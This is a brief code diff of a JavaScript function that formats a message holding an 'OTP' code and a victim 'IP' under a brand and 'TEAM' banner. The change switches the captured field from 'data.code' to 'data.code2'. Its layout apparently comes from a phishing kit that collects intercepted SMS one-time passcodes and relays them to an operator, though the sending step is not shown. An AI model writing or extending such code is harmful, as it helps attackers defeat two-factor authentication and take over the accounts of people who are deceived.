@@ -618,7 +618,7 @@ function a4(data,ip) {
   let block="";
   block += `${brand}  | [SMS](2) |  TEAM\n`; 
   block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
-  block += `OTP: ${data.code}\nIP: ${ip}\n`;
+  block += `OTP: ${data.code2}\nIP: ${ip}\n`;
   block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
   block += `${brand}  | [${target}]  |  TEAM`;
   
